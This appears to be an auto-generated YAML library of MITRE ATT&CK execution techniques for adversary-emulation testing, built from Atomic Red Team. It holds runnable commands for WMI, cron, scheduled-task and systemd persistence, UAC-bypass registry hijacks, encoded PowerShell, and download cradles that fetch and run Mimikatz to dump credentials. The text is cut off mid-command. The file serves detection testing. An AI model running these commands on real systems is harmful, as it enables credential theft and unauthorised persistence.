# AutoStrike MITRE ATT&CK Techniques - execution
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1047
  name: Windows Management Instrumentation
  description: |-
    Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.[1](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN) WMI is an administration feature that provides a uniform environment to access Windows system components.

    The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).[1](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.[1](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN) [2](https://www.mandiant.com/resources/reports)

    An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.[2](https://www.mandiant.com/resources/reports) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).[3](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)

    **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.[4](https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.[4](https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242)
  tactic: execution
  platforms:
    - windows
  executors:
    - name: WMI Reconnaissance Users
      type: cmd
      platform: windows
      command: wmic useraccount get /ALL /format:csv
      timeout: 120
      is_safe: true
    - name: WMI Reconnaissance Processes
      type: cmd
      platform: windows
      command: wmic process get caption,executablepath,commandline /format:csv
      timeout: 120
      is_safe: true
    - name: WMI Reconnaissance Software
      type: cmd
      platform: windows
      command: wmic qfe get description,installedOn /format:csv
      timeout: 120
      is_safe: true
    - name: WMI Reconnaissance List Remote Services
      type: cmd
      platform: windows
      command: wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
      timeout: 120
      is_safe: true
    - name: WMI Execute Local Process
      type: cmd
      platform: windows
      command: wmic process call create notepad.exe
      cleanup: wmic process where name='notepad.exe' delete >nul 2>&1
      timeout: 120
      is_safe: true
    - name: WMI Execute Remote Process
      type: cmd
      platform: windows
      command: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process call create notepad.exe
      cleanup: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process where name='notepad.exe' delete >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Create a Process using WMI Query and an Encoded Command
      type: cmd
      platform: windows
      command: powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
      timeout: 120
      is_safe: true
    - name: Create a Process using obfuscated Win32_Process
      type: powershell
      platform: windows
      command: |-
        $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
        $NewClass = $Class.Derive("Win32_Atomic")
        $NewClass.Put()
        Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe
      cleanup: |-
        $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Atomic"))
        try { $CleanupClass.Delete() } catch {}
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: WMI Execute rundll32
      type: cmd
      platform: windows
      command: wmic /node:127.0.0.1 process call create "rundll32.exe \"PathToAtomicsFolder\..\ExternalPayloads\calc.dll\" StartW"
      cleanup: taskkill /f /im calculator.exe
      timeout: 120
      is_safe: true
    - name: Application uninstall using WMIC
      type: cmd
      platform: windows
      command: wmic /node:"127.0.0.1" product where "name like 'Tightvnc%%'" call uninstall
      cleanup: msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1047
  is_safe: true
- id: T1053.002
  name: At
  description: |-
    Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.[1](https://www.cybereason.com/blog/wmi-lateral-movement-win32#blog-subscribe)

    On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).[2](https://man7.org/linux/man-pages/man1/at.1p.html)

    Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

    In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.[3](https://gtfobins.github.io/gtfobins/at/)
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: At.exe Scheduled task
      type: cmd
      platform: windows
      command: at 13:20 /interactive cmd
      timeout: 120
      is_safe: true
    - name: At - Schedule a job
      type: sh
      platform: linux
      command: echo "echo Hello from Atomic Red Team" | at now + 1 minute
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1053/002
  is_safe: true
- id: T1053.003
  name: Cron
  description: |-
    Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.[1](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.

    An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).[2](https://www.cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers)
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
  executors:
    - name: Cron - Replace crontab with referenced file
      type: sh
      platform: linux
      command: |-
        crontab -l > /tmp/notevil
        echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
      cleanup: crontab /tmp/notevil
      timeout: 60
      is_safe: true
    - name: Cron - Replace crontab with referenced file
      type: sh
      platform: macos
      command: |-
        crontab -l > /tmp/notevil
        echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
      cleanup: crontab /tmp/notevil
      timeout: 60
      is_safe: true
    - name: Cron - Add script to all cron subfolders
      type: bash
      platform: macos
      command: |-
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
      cleanup: |-
        rm /etc/cron.daily/persistevil -f
        rm /etc/cron.hourly/persistevil -f
        rm /etc/cron.monthly/persistevil -f
        rm /etc/cron.weekly/persistevil -f
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Cron - Add script to all cron subfolders
      type: bash
      platform: linux
      command: |-
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
      cleanup: |-
        rm /etc/cron.daily/persistevil -f
        rm /etc/cron.hourly/persistevil -f
        rm /etc/cron.monthly/persistevil -f
        rm /etc/cron.weekly/persistevil -f
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Cron - Add script to /etc/cron.d folder
      type: sh
      platform: linux
      command: echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
      cleanup: rm /etc/cron.d/persistevil -f
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
      type: bash
      platform: linux
      command: echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
      cleanup: rm /var/spool/cron/crontabs/persistevil -f
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1053/003
  is_safe: true
- id: T1053.005
  name: Scheduled Task
  description: |-
    Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.[1](https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.[2](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md)

    An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[3](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain)

    Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[4](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml)[5](https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.[6](https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments)
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Scheduled Task Startup Script
      type: cmd
      platform: windows
      command: |-
        schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
        schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
      cleanup: |-
        schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
        schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Scheduled task Local
      type: cmd
      platform: windows
      command: SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
      cleanup: SCHTASKS /Delete /TN spawn /F >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Scheduled task Remote
      type: cmd
      platform: windows
      command: SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST 20:10
      cleanup: SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN "Atomic task" /F >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Powershell Cmdlet Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $Action = New-ScheduledTaskAction -Execute "calc.exe"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        $Set = New-ScheduledTaskSettingsSet
        $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
        Register-ScheduledTask AtomicTask -InputObject $object
      cleanup: Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
      timeout: 120
      is_safe: true
    - name: Task Scheduler via VBA
      type: powershell
      platform: windows
      command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
      cleanup: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
      timeout: 120
      is_safe: true
    - name: WMI Invoke-CimMethod Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
        Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
      cleanup: Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
      type: cmd
      platform: windows
      command: |-
        reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
        schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
      cleanup: |-
        schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
        reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Import XML Schedule Task with Hidden Attribute
      type: powershell
      platform: windows
      command: |-
        $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml")
        Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
      cleanup: Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: PowerShell Modify A Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $Action = New-ScheduledTaskAction -Execute "cmd.exe"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        $Set = New-ScheduledTaskSettingsSet
        $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
        Register-ScheduledTask AtomicTaskModifed -InputObject $object
        $NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
        Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
      cleanup: Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
      timeout: 120
      is_safe: true
    - name: Scheduled Task ("Ghost Task") via Registry Key Manipulation
      type: cmd
      platform: windows
      command: |-
        "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
        "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost add lilghostie "cmd.exe" "/c notepad.exe" $env:USERDOMAIN + '\' + $env:USERNAME logon
      cleanup: |-
        "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
        "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost delete lilghostie > nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Scheduled Task Persistence via CompMgmt.msc
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
        schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
        ECHO Let's open the Computer Management console now...
        compmgmt.msc
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
        schtasks /Delete /TN "CompMgmtBypass" /F
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Scheduled Task Persistence via Eventviewer.msc
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
        schtasks /Create /TN "EventViewerBypass" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
        ECHO Let's run the schedule task ...
        schtasks /Run /TN "EventViewerBypass"
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
        schtasks /Delete /TN "EventViewerBypass" /F
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1053/005
  is_safe: true
- id: T1053.006
  name: Systemd Timers
  description: |-
    Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.[1](https://wiki.archlinux.org/index.php/Systemd/Timers) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).[2](https://www.tecmint.com/control-systemd-services-on-remote-linux-server/)

    Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.[3](http://man7.org/linux/man-pages/man1/systemd.1.html) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.

    An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.[4](https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/)[5](https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a)[6](https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.[7](https://www.hybrid-analysis.com/sample/28553b3a9d2ad4361d33d29ac4bf771d008e0073cec01b5561c6348a608f8dd7?environmentId=300)
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - linux
  executors:
    - name: Create Systemd Service and Timer
      type: bash
      platform: linux
      command: |-
        echo "[Unit]" > /etc/systemd/system/art-timer.service
        echo "Description=Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.service
        echo "[Service]" >> /etc/systemd/system/art-timer.service
        echo "Type=simple" >> /etc/systemd/system/art-timer.service
        echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> /etc/systemd/system/art-timer.service
        echo "[Install]" >> /etc/systemd/system/art-timer.service
        echo "WantedBy=multi-user.target" >> /etc/systemd/system/art-timer.service
        echo "[Unit]" > /etc/systemd/system/art-timer.timer
        echo "Description=Executes Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.timer
        echo "Requires=art-timer.service" >> /etc/systemd/system/art-timer.timer
        echo "[Timer]" >> /etc/systemd/system/art-timer.timer
        echo "Unit=art-timer.service" >> /etc/systemd/system/art-timer.timer
        echo "OnCalendar=*-*-* *:*:00" >> /etc/systemd/system/art-timer.timer
        echo "[Install]" >> /etc/systemd/system/art-timer.timer
        echo "WantedBy=timers.target" >> /etc/systemd/system/art-timer.timer
        systemctl start art-timer.timer
        systemctl enable art-timer.timer
        systemctl daemon-reload
      cleanup: |-
        systemctl stop art-timer.timer
        systemctl disable art-timer.timer
        rm /etc/systemd/system/art-timer.service
        rm /etc/systemd/system/art-timer.timer
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a user level transient systemd service and timer
      type: sh
      platform: linux
      command: systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
      cleanup: |-
        systemctl --user stop Atomic-Red-Team.service
        systemctl --user stop Atomic-Red-Team.timer
        rm /tmp/log
      timeout: 60
      is_safe: true
    - name: Create a system level transient systemd service and timer
      type: sh
      platform: linux
      command: systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
      cleanup: |-
        systemctl stop Atomic-Red-Team.service
        systemctl stop Atomic-Red-Team.timer
        rm /tmp/log
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1053/006
  is_safe: true
- id: T1059
  name: Command and Scripting Interpreter
  description: |-
    Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

    There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

    Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.[1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1)[2](https://tools.cisco.com/security/center/resources/integrity_assurance.html#23)[3](https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python)
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: AutoIt Script Execution
      type: powershell
      platform: windows
      command: Start-Process -FilePath "C:\Program Files (x86)\AutoIt3\AutoIt3.exe" -ArgumentList "PathToAtomicsFolder\T1059\src\calc.au3"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059
  is_safe: true
- id: T1059.001
  name: PowerShell
  description: |-
    Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[1](https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

    PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

    A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.[2](https://github.com/Exploit-install/PSAttack-1)

    PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).[3](https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367)[4](https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/)[5](https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/)
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Mimikatz
      type: cmd
      platform: windows
      command: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Run BloodHound from local disk
      type: powershell
      platform: windows
      command: |-
        import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
        try { Invoke-BloodHound -OutputDirectory $env:Temp }
        catch { $_; exit $_.Exception.HResult}
        Start-Sleep 5
      cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
      timeout: 120
      is_safe: true
    - name: Run Bloodhound from Memory using Download Cradle
      type: powershell
      platform: windows
      command: |-
        write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
        IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
        Invoke-BloodHound -OutputDirectory $env:Temp
        Start-Sleep 5
      cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
      timeout: 120
      is_safe: true
    - name: Mimikatz - Cradlecraft PsSendKeys
      type: powershell
      platform: windows
      command: $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item 